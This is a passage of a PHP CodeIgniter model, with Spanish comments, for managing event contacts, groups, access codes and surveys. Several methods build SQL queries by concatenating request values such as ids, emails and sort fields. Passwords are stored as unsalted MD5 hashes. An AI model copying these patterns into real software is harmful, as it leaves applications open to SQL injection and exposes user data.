<?php defined('BASEPATH') or exit('No direct script access allowed');


class Evento_model extends CI_Model {

	public function verificarSiExiste($grupo, $empresa, $email)
	{
		$sql = "
				SELECT *
					
				FROM eventos_contactos
				
				WHERE grupo = ?
				AND id_empresa = ?
				AND email = ?
			";
			
		$placeholders[] = $grupo;
		$placeholders[] = $empresa;
		$placeholders[] = $email;

		// consulta
		$query = $this->db->query($sql, $placeholders);
		
		
		if (!isset($res['error']) && $query)
		{
			$res = $query->row_array();
		}		

		return (!empty($res)) ? $res : null;
	}
	
	
	public function verificarEleccion($grupo, $empresa, $email)
	{
		$sql = "
				SELECT id, nombre, email, id_eventos_grupo
				FROM eventos_contactos
				WHERE grupo = ?
				AND id_empresa = ?
				AND email = ?
				AND id_eventos_grupo > 0
			";
		$placeholders[] = $grupo;
		$placeholders[] = $empresa;
		$placeholders[] = $email;

		// consulta
		$query = $this->db->query($sql, $placeholders);
		
		
		if (!isset($res['error']) && $query)
		{
			$res = $query->row_array();
		}		

		return (!empty($res)) ? $res : null;
	}

	public function updateUltimaVisita($valores)
	{
		$id = $valores['id'];
		$estado = $valores['estado'];
		
		$sql = "SELECT id, estado FROM eventos_contactos WHERE id = $id";
		$query = $this->db->query($sql);
		$res = $query->row_array();

		$this->db->set('ultima_visita', unix_to_human(now(), true, 'eu')); // DEPRECATED
		$this->db->set('utc_ultima_visita', now());
		$this->db->set('ip', $_SERVER['REMOTE_ADDR']);
		$this->db->set('estado', $estado);
		$this->db->set('fecha_modificacion', unix_to_human(now(), true, 'eu'));
		$this->db->set('username_modificacion', $this->usuario->id);

		//if($res['estado'] < 4) { $this->db->set('estado', 3);}

		$this->db->where('id', $id);
		$res = $this->db->update('eventos_contactos');

		return (!empty($res)) ? $res : null;
	}

	//COPIADA DE Contacto_model PERO CAMBIADA LA TABLA
	public function ingresarContacto($valores)
	{
		$data['grupo'] = $this->usuario->grupo;
		$data['id_empresa'] = $this->usuario->id_empresa;
		$data['email'] = $valores['email'];

		if (isset($valores['nombre'])) $data['nombre'] = (!empty($valores['nombre'])) ? $valores['nombre'] : null;
		if (isset($valores['apellido'])) $data['apellido'] = (!empty($valores['apellido'])) ? $valores['apellido'] : null;
		if (isset($valores['estado'])) $data['estado'] = (!empty($valores['estado'])) ? $valores['estado'] : null;
		if (isset($valores['area_privada'])) $data['area_privada'] = (!empty($valores['area_privada'])) ? $valores['area_privada'] : null;
		if (isset($valores['username'])) $data['username'] = (!empty($valores['username'])) ? $valores['username'] : null;
		if (!empty($valores['password'])) $data['password'] = md5($valores['password']);
		$data['hash'] = md5(uniqid());
		if (isset($valores['timezone'])) $data['timezone'] = (!empty($valores['timezone'])) ? $valores['timezone'] : null;
		if (isset($valores['idioma'])) $data['idioma'] = (!empty($valores['idioma'])) ? $valores['idioma'] : null;
		if (isset($valores['sexo'])) $data['sexo'] = (!empty($valores['sexo'])) ? $valores['sexo'] : null;
		if (isset($valores['observaciones'])) $data['observaciones'] = (!empty($valores['observaciones'])) ? $valores['observaciones'] : null;
		$data['_pais'] = $valores['pais'];
		
		$data['fecha_alta'] = unix_to_human(now(), true, 'eu');
		$data['username_alta'] = $this->usuario->id;
		
		if (!isset($res['error']))
		{
			$insert = $this->db->insert('eventos_contactos', $data);
			
			$res = $this->db->insert_id();
		}
		return (!empty($res)) ? $res : null;
	}

	public function modificarContacto($valores)
	{
		$grupo = $this->usuario->grupo;
		$empresa = $this->usuario->id_empresa;
		//$datos['password'] = md5($valores['password']);

		if (isset($valores['nombre'])) $data['nombre'] = (!empty($valores['nombre'])) ? $valores['nombre'] : null;
		if (isset($valores['apellido'])) $data['apellido'] = (!empty($valores['apellido'])) ? $valores['apellido'] : null;
		if (isset($valores['email'])) $data['email'] = (!empty($valores['email'])) ? $valores['email'] : null;
		if (isset($valores['sexo'])) $data['sexo'] = (!empty($valores['sexo'])) ? $valores['sexo'] : null;
		if (isset($valores['pais'])) $data['_pais'] = (!empty($valores['pais'])) ? $valores['pais'] : null;
		if (isset($valores['observaciones'])) $data['observaciones'] = (!empty($valores['observaciones'])) ? $valores['observaciones'] : null;
		if (isset($valores['_observaciones'])) $data['_observaciones'] = (!empty($valores['_observaciones'])) ? $valores['_observaciones'] : null;
		if (!empty($valores['password'])) $data['password'] = md5($valores['password']);
		$data['fecha_modificacion'] = unix_to_human(now(), true, 'eu');
		$data['username_modificacion'] = $this->usuario->id;

		$where = "id = ".$valores['contacto']. " AND grupo = ".$grupo." AND id_empresa = ".$empresa; 
		$res = $this->db->update('eventos_contactos', $data, $where);

		return (!empty($res)) ? $res : null;
	}

	public function getInscriptos($grupo, $empresa)
	{
		$sql = "
				SELECT COUNT(*) as total
				FROM eventos_contactos
				
				WHERE grupo = ?
				AND id_empresa = ?
			";
			
		$placeholders[] = $grupo;
		$placeholders[] = $empresa;

		// consulta
		$query = $this->db->query($sql, $placeholders);
		
		
		if (!isset($res['error']) && $query)
		{
			$res = $query->row_array();
		}		

		return (!empty($res)) ? $res : null;
	}

	public function getGrupos($grupo, $empresa)
	{
		$sql = "
				SELECT *
				FROM eventos_grupos
				
				WHERE grupo = ?
				AND id_empresa = ?
			";
			
		$placeholders[] = $grupo;
		$placeholders[] = $empresa;

		// consulta
		$query = $this->db->query($sql, $placeholders);
		
		if (!isset($res['error']) && $query)
		{
			$res = $query->result_array();
		}		

		return (!empty($res)) ? $res : null;
	}

	public function getEventos($parametros = null)
	{
		if (!empty($parametros['id_contacto']))
		{
			$sql = "SELECT eventos.id, eventos.titulo, eventos.subtitulo, eventos.codigo, eventos.fecha_vencimiento, eventos.orden, eventos.estado, eventos_rel_evento_contactos.certificado FROM eventos";
			$sql .= " LEFT JOIN eventos_rel_evento_contactos ON eventos_rel_evento_contactos.id_evento = eventos.id";
			$sql .= " WHERE eventos.grupo = ?";
		}
		else
		{
			$sql = "SELECT id, titulo, subtitulo, codigo, fecha_vencimiento, orden, estado FROM eventos WHERE eventos.grupo = ?";
		}
			
		// permisos	
		if ($this->usuario->perfil == 'reseller')
		{
			$placeholders[] = $this->usuario->grupo;
			
			if (isset($parametros['id_empresa']))
			{
				$sql .= " AND eventos.id_empresa = ?";
				$placeholders[] = $parametros['id_empresa'];
			}
		}
		elseif ($this->usuario->perfil == 'admin')
		{
			$placeholders[] = $this->usuario->grupo;
			
			$sql .= " AND eventos.id_empresa = ?"; $placeholders[] = $this->usuario->id_empresa;
		}
		else
		{
			$res['error'] = 'Este perfil no cuenta con los privilegios necesarios';
		}

		// filtros
		if (!empty($parametros['estado']))
		{
			$sql .= " AND eventos.estado = ?";
			$placeholders[] = $parametros['estado'];
		}
		else
		{
			$sql .= " AND eventos.estado > 0";
		}

		if (!empty($parametros['id_contacto']))
		{
			$sql .= " AND eventos_rel_evento_contactos.id_contacto = ?";
			$placeholders[] = $parametros['id_contacto'];
		}

		// orden
		$sql .= " ORDER BY";
		$sql .= (!empty($parametros['order_by'])) ? " " . $parametros['order_by'] : " eventos.titulo";
		$sql .= (!empty($parametros['order'])) ? " " . $parametros['order'] : " ASC";
		
		// limite
		$sql .= " LIMIT ?, ?";
		$placeholders[] = (isset($parametros['page'])) ? ($this->config->item('use_page_numbers') == true) ? ($parametros['page']-1)*$this->config->item('per_page') : $parametros['page'] : 0;
		$placeholders[] = (isset($parametros['per_page'])) ? (int) $parametros['per_page'] : $this->config->item('per_page');
		
		// consulta
		$query = $this->db->query($sql, $placeholders);
		
		if (!isset($res['error']) && $query)
		{
			$res = $query->result_array();
		}
		
		return (!empty($res)) ? $res : null;
	}

	public function ingresarGrupo($valores)
	{
		$data['id_eventos_contacto'] = $valores['id_usuario'];
		$data['fecha_modificacion'] = unix_to_human(now(), true, 'eu');
		$data['username_modificacion'] = $this->usuario->id;
		
		if (!isset($res['error']))
		{
			$where = "id = ".$valores['grupo_evento'];
			$res = $this->db->update('eventos_grupos', $data, $where);
		}
		return (!empty($res)) ? $res : null;
	}
	
	public function ingresarIntegrantes($valores)
	{
		$data['estado'] = 4;
		$data['fecha_modificacion'] = unix_to_human(now(), true, 'eu');
		$data['username_modificacion'] = $this->usuario->id;
		
		if (!isset($res['error']))
		{
			$where = "id = ".$valores['grupo_evento'];
			$res = $this->db->update('eventos_grupos', $data, $where);

			$datos['id_eventos_grupo'] = $valores['grupo_evento'];
			$datos['estado'] = 4;
			$datos['fecha_modificacion'] = unix_to_human(now(), true, 'eu');
			$datos['username_modificacion'] = $this->usuario->id;
			$datos['grupo'] = $this->usuario->grupo;
			$datos['id_empresa'] = $this->usuario->id_empresa;

			//Integrante 1
			if(isset($valores['email1'])) 
			{ 
				$where1 = "email = '".$valores['email1']. "' AND grupo = ".$datos['grupo']." AND id_empresa = ".$datos['id_empresa']; $res = $this->db->update('eventos_contactos', $datos, $where1);
			}
			//Integrante 2
			if(isset($valores['email2'])) 
			{ 
				$where2 = "email = '".$valores['email2']. "' AND grupo = ".$datos['grupo']." AND id_empresa = ".$datos['id_empresa']; $res = $this->db->update('eventos_contactos', $datos, $where2);
			}
			//Integrante 3
			if(isset($valores['email3'])) 
			{ 
				$where3 = "email = '".$valores['email3']. "' AND grupo = ".$datos['grupo']." AND id_empresa = ".$datos['id_empresa']; $res = $this->db->update('eventos_contactos', $datos, $where3);
			}
			//Integrante 4
			if(isset($valores['email3'])) 
			{ 
				$where4 = "email = '".$valores['email3']. "' AND grupo = ".$datos['grupo']." AND id_empresa = ".$datos['id_empresa']; $res = $this->db->update('eventos_contactos', $datos, $where4);
			}
			//Integrante 5
			if(isset($valores['email5'])) 
			{ 
				$where5 = "email = '".$valores['email5']. "' AND grupo = ".$datos['grupo']." AND id_empresa = ".$datos['id_empresa']; $res = $this->db->update('eventos_contactos', $datos, $where5);
			}
			
		}
		return (!empty($res)) ? $res : null;
	}

	public function updateIntegrantes($grupo, $empresa, $id)
	{
		$data['id_eventos_contacto'] = null;
		$data['estado'] = 2;
		$data['fecha_modificacion'] = unix_to_human(now(), true, 'eu');
		$data['username_modificacion'] = $this->usuario->id;

		$where = "id = $id";
		$res = $this->db->update('eventos_grupos', $data, $where);
		
		if (!isset($res['error']))
		{
			$datos['estado'] = 3;
			$datos['id_eventos_grupo'] = null;
			$datos['fecha_modificacion'] = unix_to_human(now(), true, 'eu');
			$datos['username_modificacion'] = $this->usuario->id;
	
			$where = "id_eventos_grupo = $id";
			$res2 = $this->db->update('eventos_contactos', $datos, $where);
		}

		return (!empty($res2)) ? $res2 : null;
	}

	//VERIFICAR CODIGO
	public function verificarCodigo($grupo, $empresa, $codigo, $estado = null)
	{
		$sql = "SELECT * FROM eventos
				WHERE grupo = ?
				AND id_empresa = ?
				AND codigo = ?
				AND fecha_vencimiento > NOW()
			";
			
		$placeholders[] = $grupo;
		$placeholders[] = $empresa;
		$placeholders[] = $codigo;
		if($estado != null)
		{
			$sql .= " AND estado = 2";
		}

		// consulta
		$query = $this->db->query($sql, $placeholders);
		
		if (!isset($res['error']) && $query)
		{
			$res = $query->row_array();
		}		
		
		return (!empty($res)) ? $res : null;
	}

	//VERIFICAR CODIGO
	public function relacionarCodigo($valores)
	{
		$sql = "SELECT id, certificado FROM eventos_rel_evento_contactos";
		$sql .= " WHERE grupo = ".$this->usuario->grupo;
		$sql .= " AND id_empresa = ".$this->usuario->id_empresa;
		$sql .= " AND id_evento = ".$valores['id_evento'];
		$sql .= " AND id_contacto = ".$valores['id_contacto'];
		$query = $this->db->query($sql);
		$res1 = $query->row_array();

		if(!$res1)
		{	
			$data['grupo'] = $this->usuario->grupo;
			$data['id_empresa'] = $this->usuario->id_empresa;
			$data['id_evento'] = $valores['id_evento'];
			$data['id_contacto'] = $valores['id_contacto'];
			$data['certificado'] = 0;
			$insert = $this->db->insert('eventos_rel_evento_contactos', $data);
			$res['id'] = $this->db->insert_id();
		
			return (!empty($res)) ? $res : null;
		}
		else
		{
			return (!empty($res1)) ? $res1 : null;
		}
	}

	//DETALLE EVENTO
	public function detalleEvento($id, $parametros=null)
	{
		$sql = "SELECT eventos.*, media_thumbs.archivo as imagen FROM eventos";
		$sql .= " LEFT JOIN media_thumbs ON media_thumbs.referencia = eventos.id_media";
		$sql .= " WHERE eventos.grupo = ?";

		// permisos
		if ($this->usuario->perfil == 'reseller')
		{
			$placeholders[] = $this->usuario->grupo;
			
			if (isset($parametros['id_empresa']))
			{
				$sql .= " AND eventos.id_empresa = ?";
				$placeholders[] = $parametros['id_empresa'];
			}
		}
		elseif ($this->usuario->perfil == 'admin')
		{
			$placeholders[] = $this->usuario->grupo;
			
			$sql .= " AND eventos.id_empresa = ?"; $placeholders[] = $this->usuario->id_empresa;
		}
		else
		{
			$res['error'] = 'Este perfil no cuenta con los privilegios necesarios';
		}
		$sql .= " AND eventos.id = $id";
		$sql .= " AND media_thumbs.id_tipo = 28";

		// filtros
		if (!empty($parametros['estado']))
		{
			$sql .= " AND eventos.estado = ?";
			$placeholders[] = $parametros['estado'];
		}

		// consulta
		$query = $this->db->query($sql, $placeholders);

		if (!isset($res['error']) && $query)
		{
			$res = $query->row_array();
		}
		
		return (!empty($res)) ? $res : null;
	}

	//INGRESAR EVENTO
	public function ingresarEvento($valores)
	{
		$this->load->helper('date');
		
		$sql = "SELECT id, orden FROM eventos WHERE grupo = ? AND id_empresa = ? ORDER BY orden DESC LIMIT 1";
		$placeholders[] = $this->usuario->grupo;
		$placeholders[] = $this->usuario->id_empresa;

		$query = $this->db->query($sql, $placeholders);
		$orden = $query->row_array();

		if($orden['orden'] > 0) { $data['orden'] = $orden['orden']+1; } else { $data['orden'] = 1; }
		
		$data['grupo'] = $this->usuario->grupo;
		$data['id_empresa'] = $this->usuario->id_empresa;
		$data['titulo'] = $valores['titulo'];
		if(isset($valores['subtitulo'])) { $data['subtitulo'] = $valores['subtitulo']; }
		$data['fecha_vencimiento'] = date('Y-m-d', strtotime($this->input->post('fecha_vencimiento')));
		$data['codigo'] = $valores['codigo'];
		$data['estado'] = $valores['estado'];
		$data['fecha_alta'] = now();
		$data['username_alta'] = $this->usuario->id;
		$insert = $this->db->insert('eventos', $data);
		$res['id'] = $this->db->insert_id();

		return (!empty($res)) ? $res : null;
	}

	//MODIFICAR EVENTO
	public function modificarEvento($id, $valores)
	{
		$this->load->helper('date');

		if(isset($valores['titulo'])) { $data['titulo'] = $valores['titulo']; }
		if(isset($valores['subtitulo'])) { $data['subtitulo'] = $valores['subtitulo']; }
		if(isset($valores['fecha_vencimiento'])) { $data['fecha_vencimiento'] = date('Y-m-d', strtotime($this->input->post('fecha_vencimiento'))); }
		if(isset($valores['codigo'])) { $data['codigo'] = $valores['codigo']; }
		if(isset($valores['estado'])) { $data['estado'] = $valores['estado']; }
		if(isset($valores['id_media'])) { $data['id_media'] = $valores['id_media']; }
		$data['fecha_modificacion'] = now();
		$data['username_modificacion'] = $this->usuario->id;
		$where = "id = $id";
		$res = $this->db->update('eventos', $data, $where);
		
		return (!empty($res)) ? $res : null;
	}

	//DUPLICAR EVENTO
	public function duplicarEvento($id)
	{
		$sql = "SELECT * FROM eventos WHERE grupo = ? AND id_empresa = ? AND id = ?";
		$placeholders[] = $this->usuario->grupo;
		$placeholders[] = $this->usuario->id_empresa;
		$placeholders[] = $id;

		$query = $this->db->query($sql, $placeholders);
		$item = $query->row_array();

		$sql2 = "SELECT id, orden FROM eventos WHERE grupo = ? AND id_empresa = ? ORDER BY orden DESC LIMIT 1";
		$placeholders2[] = $this->usuario->grupo;
		$placeholders2[] = $this->usuario->id_empresa;

		$query = $this->db->query($sql2, $placeholders2);
		$orden = $query->row_array();

		if($orden['orden'] > 0) { $data['orden'] = $orden['orden']+1; } else { $data['orden'] = 1; }
		
		$data['grupo'] = $item['grupo'];
		$data['id_empresa'] = $item['id_empresa'];
		$data['titulo'] = $item['titulo'].'-copy';
		$data['subtitulo'] = $item['subtitulo'];
		$data['fecha_vencimiento'] = $item['fecha_vencimiento'];
		$data['codigo'] = $item['codigo'];
		$data['estado'] = 1;
		$data['fecha_alta'] = now();
		$data['username_alta'] = $this->usuario->id;
		$res = $this->db->insert('eventos', $data);
		
		return (!empty($res)) ? $res : null;
	}


	public function detalleGrupo($grupo, $empresa, $id)
	{
		$sql = "SELECT nombre, horario
				FROM eventos_grupos
				WHERE grupo = ?
				AND id_empresa = ?
				AND id = ?
			";
			
		$placeholders[] = $grupo;
		$placeholders[] = $empresa;
		$placeholders[] = $id;

		// consulta
		$query = $this->db->query($sql, $placeholders);
		
		if (!isset($res['error']) && $query)
		{
			$res = $query->row_array();
		}		

		return (!empty($res)) ? $res : null;
	}

	public function detalleContacto($grupo, $empresa, $id)
	{
		$sql = "SELECT eventos_contactos.nombre, eventos_contactos.apellido, eventos_contactos.email, eventos_contactos.sexo, eventos_contactos.id_eventos_grupo, eventos_contactos.cargo, eventos_contactos._pais, eventos_contactos.username, eventos_contactos.observaciones, eventos_contactos.estado FROM eventos_contactos
				WHERE grupo = ?
				AND id_empresa = ?
				AND id = ?
			";
		$placeholders[] = $grupo;
		$placeholders[] = $empresa;
		$placeholders[] = $id;

		// consulta
		$query = $this->db->query($sql, $placeholders);
		
		if (!isset($res['error']) && $query)
		{
			$res = $query->row_array();
		}		

		return (!empty($res)) ? $res : null;
	}

	public function getPaises()
	{
		$sql = "SELECT codigo, pais
				FROM sys_paises
				WHERE estado > 0
				ORDER BY pais ASC";

		// consulta
		$query = $this->db->query($sql);
		
		if (!isset($res['error']) && $query)
		{
			$res = $query->result_array();
		}		

		return (!empty($res)) ? $res : null;
	}

	public function verificarRespuesta($valores)
	{
		$sql = "
				SELECT *
					
				FROM eventos_encuestas
				
				WHERE grupo = ?
				AND id_empresa = ?
				AND id_eventos_contacto = ?
				AND id_encuesta = ?
				AND id_pregunta = ?
			";
			
		$placeholders[] = $this->usuario->grupo;
		$placeholders[] = $this->usuario->id_empresa;
		$placeholders[] = $valores['contacto'];
		$placeholders[] = $valores['id_encuesta'];
		$placeholders[] = $valores['id_pregunta'];

		// consulta
		$query = $this->db->query($sql, $placeholders);
		
		if (!isset($res['error']) && $query)
		{
			$res = $query->row_array();
		}		

		return (!empty($res)) ? $res : null;
	}

	public function ingresarRespuesta($valores)
	{
		$data['grupo'] = $this->usuario->grupo;
		$data['id_empresa'] = $this->usuario->id_empresa;
		$data['id_eventos_contacto'] = $valores['contacto'];
		$data['id_encuesta'] = $valores['id_encuesta'];
		$data['id_pregunta'] = $valores['id_pregunta'];
		$data['id_respuesta'] = $valores['id_respuesta'];
		$data['fecha_alta'] = unix_to_human(now(), true, 'eu');
		//VERIFICAR SI FUNCIONA
		$data['username_alta'] = $this->usuario->id;
/* 		$data['username_alta'] = 'revision'; */
		
		if (!isset($res['error']))
		{
			$insert = $this->db->insert('eventos_encuestas', $data);
			
			$res = $this->db->insert_id();
		}
		return (!empty($res)) ? $res : null;
	}

	public function estadisticasRespuestas($parametros = null)
	{
		$sql = "SELECT eventos_encuestas.id_pregunta, eventos_encuestas.id_respuesta, eventos_contactos.apellido, eventos_contactos.nombre, eventos_contactos.email
				FROM eventos_encuestas
				LEFT JOIN eventos_contactos ON eventos_contactos.id = eventos_encuestas.id_eventos_contacto
				WHERE eventos_encuestas.grupo = 502
				AND eventos_encuestas.id_empresa = 7437
				AND eventos_encuestas.id_pregunta = ". $parametros['pregunta'];

		if (isset($parametros['respuesta']))
		{
			$sql .= " AND eventos_encuestas.id_respuesta = ".$parametros['respuesta'];
		}

		$query = $this->db->query($sql);
		$res = $query->result_array();

		return (!empty($res)) ? $res : null;
	}
	
	//LISTADO CONTACTOS
	public function getContactos($parametros = null)
	{
		$sql = "SELECT eventos_contactos.* FROM eventos_contactos
				LEFT JOIN eventos_rel_evento_contactos ON eventos_rel_evento_contactos.id_contacto = eventos_contactos.id
				WHERE eventos_contactos.grupo = ?";
			
		// permisos	
		if ($this->usuario->perfil == 'reseller')
		{
			$placeholders[] = $this->usuario->grupo;
			
			if (isset($parametros['id_empresa']))
			{
				$sql .= " AND eventos_contactos.id_empresa = ?";
				$placeholders[] = $parametros['id_empresa'];
			}
		}
		elseif ($this->usuario->perfil == 'admin')
		{
			$placeholders[] = $this->usuario->grupo;
			
			$sql .= " AND eventos_contactos.id_empresa = ?"; $placeholders[] = $this->usuario->id_empresa;
		}
		else
		{
			$res['error'] = 'Este perfil no cuenta con los privilegios necesarios';
		}

		// filtros
		if (!empty($parametros['estado']))
		{
			$sql .= " AND eventos_contactos.estado = ?";
			$placeholders[] = $parametros['estado'];
		}
		else
		{
			$sql .= " AND eventos_contactos.estado > 0";
		}

		if (!empty($parametros['id_evento']))
		{
			$sql .= " AND eventos_rel_evento_contactos.id_evento = ?";
			$placeholders[] = $parametros['id_evento'];
		}

		// orden
		$sql .= " ORDER BY";
		$sql .= (!empty($parametros['order_by'])) ? " " . $parametros['order_by'] : " eventos_contactos.nombre";
		$sql .= (!empty($parametros['order'])) ? " " . $parametros['order'] : " ASC";
		
		// limite
		$sql .= " LIMIT ?, ?";
		$placeholders[] = (isset($parametros['page'])) ? ($this->config->item('use_page_numbers') == true) ? ($parametros['page']-1)*$this->config->item('per_page') : $parametros['page'] : 0;
		$placeholders[] = (isset($parametros['per_page'])) ? (int) $parametros['per_page'] : $this->config->item('per_page');
		
		// consulta
		$query = $this->db->query($sql, $placeholders);
		
		if (!isset($res['error']) && $query)
		{
			$res = $query->result_array();
		}
		
		return (!empty($res)) ? $res : null;
	}
	
	//LISTADO PREGUNTAS
	public function getPreguntas($parametros = null)
	{
		$sql = "SELECT * FROM eventos_preguntas WHERE grupo = ?";
			
		// permisos	
		if ($this->usuario->perfil == 'reseller')
		{
			$placeholders[] = $this->usuario->grupo;
			
			if (isset($parametros['id_empresa']))
			{
				$sql .= " AND id_empresa = ?";
				$placeholders[] = $parametros['id_empresa'];
			}
		}
		elseif ($this->usuario->perfil == 'admin')
		{
			$placeholders[] = $this->usuario->grupo;
			
			$sql .= " AND id_empresa = ?"; $placeholders[] = $this->usuario->id_empresa;
		}
		else
		{
			$res['error'] = 'Este perfil no cuenta con los privilegios necesarios';
		}

		// filtros
		if (!empty($parametros['estado']))
		{
			$sql .= " AND estado = ?";
			$placeholders[] = $parametros['estado'];
		}
		else
		{
			$sql .= " AND estado > 0";
		}

		if (!empty($parametros['encuesta']))
		{
			if($parametros['encuesta'] == 1)
			{ 
				$sql .= " AND para_certificar = 0";
			}
			else
			{ 
				$sql .= " AND para_certificar = 1";
			}
		}

		if (!empty($parametros['id_evento']))
		{
			$sql .= " AND id_evento = ?";
			$placeholders[] = $parametros['id_evento'];
		}

		// orden
		$sql .= " ORDER BY";
		$sql .= (!empty($parametros['order_by'])) ? " " . $parametros['order_by'] : " orden";
		$sql .= (!empty($parametros['order'])) ? " " . $parametros['order'] : " ASC";

		// limite
		$sql .= " LIMIT ?, ?";
		$placeholders[] = (isset($parametros['page'])) ? ($this->config->item('use_page_numbers') == true) ? ($parametros['page']-1)*$this->config->item('per_page') : $parametros['page'] : 0;
		$placeholders[] = (isset($parametros['per_page'])) ? (int) $parametros['per_page'] : $this->config->item('per_page');
		
		// consulta
		$query = $this->db->query($sql, $placeholders);
		
		if (!isset($res['error']) && $query)
		{
			$res = $query->result_array();
		}
		
		return (!empty($res)) ? $res : null;
	}

	//DETALLE PREGUNTA
	public function detallePregunta($id, $parametros=null)
	{
		$sql = "SELECT * FROM eventos_preguntas";
		$sql .= " WHERE eventos_preguntas.grupo = ?";

		// permisos
		if ($this->usuario->perfil == 'reseller')
		{
			$placeholders[] = $this->usuario->grupo;
			
			if (isset($parametros['id_empresa']))
			{
				$sql .= " AND eventos_preguntas.id_empresa = ?";
				$placeholders[] = $parametros['id_empresa'];
			}
		}
		elseif ($this->usuario->perfil == 'admin')
		{
			$placeholders[] = $this->usuario->grupo;
			
			$sql .= " AND eventos_preguntas.id_empresa = ?"; $placeholders[] = $this->usuario->id_empresa;
		}
		else
		{
			$res['error'] = 'Este perfil no cuenta con los privilegios necesarios';
		}
		$sql .= " AND eventos_preguntas.id = $id";

		// filtros
		if (!empty($parametros['estado']))
		{
			$sql .= " AND eventos_preguntas.estado = ?";
			$placeholders[] = $parametros['estado'];
		}

		// consulta
		$query = $this->db->query($sql, $placeholders);

		if (!isset($res['error']) && $query)
		{
			$res = $query->row_array();
		}
		
		return (!empty($res)) ? $res : null;
	}

	//INGRESAR PREGUNTA
	public function ingresarPregunta($valores)
	{
		$sql = "SELECT id, orden FROM eventos_preguntas WHERE grupo = ? AND id_empresa = ? ORDER BY orden DESC LIMIT 1";
		$placeholders[] = $this->usuario->grupo;
		$placeholders[] = $this->usuario->id_empresa;
		$query = $this->db->query($sql, $placeholders);
		$orden = $query->row_array();

		if($orden['orden'] > 0) { $data['orden'] = $orden['orden']+1; } else { $data['orden'] = 1; }
		$data['grupo'] = $this->usuario->grupo;
		$data['id_empresa'] = $this->usuario->id_empresa;
		$data['id_evento'] = $valores['id_evento'];
		$data['titulo'] = $valores['titulo'];
		if(isset($valores['subtitulo'])) { $data['subtitulo'] = $valores['subtitulo']; }
		if(isset($valores['cantidad_respuestas'])) { $data['cantidad_respuestas'] = $valores['cantidad_respuestas']; }
		$data['para_certificar'] = $valores['para_certificar'];
		$data['obligatoria'] = $valores['obligatoria'];
		$data['anonima'] = $valores['anonima'];
		$data['estado'] = $valores['estado'];
		$data['fecha_alta'] = now();
		$data['username_alta'] = $this->usuario->id;
		$res = $this->db->insert('eventos_preguntas', $data);
		$id = $this->db->insert_id();

		return (!empty($res)) ? $res : null;
	}

	//MODIFICAR PREGUNTA
	public function modificarPregunta($id, $valores)
	{
		$data['titulo'] = $valores['titulo'];
		if(isset($valores['subtitulo'])) { $data['subtitulo'] = $valores['subtitulo']; }
		$data['para_certificar'] = $valores['para_certificar'];
		$data['obligatoria'] = $valores['obligatoria'];
		$data['anonima'] = $valores['anonima'];
		if(isset($valores['cantidad_respuestas'])) { $data['cantidad_respuestas'] = $valores['cantidad_respuestas']; }
		$data['estado'] = $valores['estado'];
		$data['fecha_modificacion'] = now();
		$data['username_modificacion'] = $this->usuario->id;
		$id = $this->input->post('id');
		$where = "id = $id";
		$res = $this->db->update('eventos_preguntas', $data, $where);
		
		return (!empty($res)) ? $res : null;
	}

	//DUPLICAR PREGUNTA
	public function duplicarPregunta($id)
	{
		$sql = "SELECT * FROM eventos_preguntas WHERE grupo = ? AND id_empresa = ? AND id = ?";
		$placeholders[] = $this->usuario->grupo;
		$placeholders[] = $this->usuario->id_empresa;
		$placeholders[] = $id;

		$query = $this->db->query($sql, $placeholders);
		$item = $query->row_array();

		$sql2 = "SELECT id, orden FROM eventos_preguntas WHERE grupo = ? AND id_empresa = ? ORDER BY orden DESC LIMIT 1";
		$placeholders2[] = $this->usuario->grupo;
		$placeholders2[] = $this->usuario->id_empresa;

		$query = $this->db->query($sql2, $placeholders2);
		$orden = $query->row_array();

		if($orden['orden'] > 0) { $data['orden'] = $orden['orden']+1; } else { $data['orden'] = 1; }
		
		$data['grupo'] = $item['grupo'];
		$data['id_empresa'] = $item['id_empresa'];
		$data['id_evento'] = $item['id_evento'];
		$data['titulo'] = $item['titulo'].'-copy';
		$data['subtitulo'] = $item['subtitulo'];
		$data['para_certificar'] = $item['para_certificar'];
		$data['obligatoria'] = $item['obligatoria'];
		$data['anonima'] = $item['anonima'];
		$data['cantidad_respuestas'] = $item['cantidad_respuestas'];
		$data['estado'] = 1;
		$data['fecha_alta'] = now();
		$data['username_alta'] = $this->usuario->id;
		$insert = $this->db->insert('eventos_preguntas', $data);
		$res = $this->db->insert_id();
		
		//INGRESO RESPUESTAS ASOCIADAS
		if($res)
		{
			$sql = "SELECT * FROM eventos_respuestas WHERE id_pregunta = $id";
			$query = $this->db->query($sql);
			$respuestas = $query->result_array();
			
			foreach($respuestas as $respuesta)
			{
				$data2['grupo'] = $respuesta['grupo'];
				$data2['id_empresa'] = $respuesta['id_empresa'];
				$data2['id_pregunta'] = $res;
				$data2['titulo'] = $respuesta['titulo'];
				$data2['subtitulo'] = $respuesta['subtitulo'];
				$data2['correcta'] = $respuesta['correcta'];
				$data2['orden'] = $respuesta['orden'];
				$data2['estado'] = $respuesta['estado'];
				$data2['fecha_alta'] = now();
				$data2['username_alta'] = $this->usuario->id;
				$res2 = $this->db->insert('eventos_respuestas', $data2);
			}
		}
		return (!empty($res)) ? $res : null;
	}


	//LISTADO RESPUESTAS
	public function getRespuestas($parametros = null)
	{
		$sql = "SELECT * FROM eventos_respuestas WHERE grupo = ?";
			
		// permisos	
		if ($this->usuario->perfil == 'reseller')
		{
			$placeholders[] = $this->usuario->grupo;
			
			if (isset($parametros['id_empresa']))
			{
				$sql .= " AND id_empresa = ?";
				$placeholders[] = $parametros['id_empresa'];
			}
		}
		elseif ($this->usuario->perfil == 'admin')
		{
			$placeholders[] = $this->usuario->grupo;
			
			$sql .= " AND id_empresa = ?"; $placeholders[] = $this->usuario->id_empresa;
		}
		else
		{
			$res['error'] = 'Este perfil no cuenta con los privilegios necesarios';
		}

		// filtros
		if (!empty($parametros['estado']))
		{
			$sql .= " AND estado = ?";
			$placeholders[] = $parametros['estado'];
		}
		else
		{
			$sql .= " AND estado > 0";
		}

		if (!empty($parametros['pregunta']))
		{
			$sql .= " AND id_pregunta = ?";
			$placeholders[] = $parametros['pregunta'];
		}

		// orden
		$sql .= " ORDER BY";
		$sql .= (!empty($parametros['order_by'])) ? " " . $parametros['order_by'] : " orden";
		$sql .= (!empty($parametros['order'])) ? " " . $parametros['order'] : " ASC";
		
		// limite
		$sql .= " LIMIT ?, ?";
		$placeholders[] = (isset($parametros['page'])) ? ($this->config->item('use_page_numbers') == true) ? ($parametros['page']-1)*$this->config->item('per_page') : $parametros['page'] : 0;
		$placeholders[] = (isset($parametros['per_page'])) ? (int) $parametros['per_page'] : $this->config->item('per_page');
		
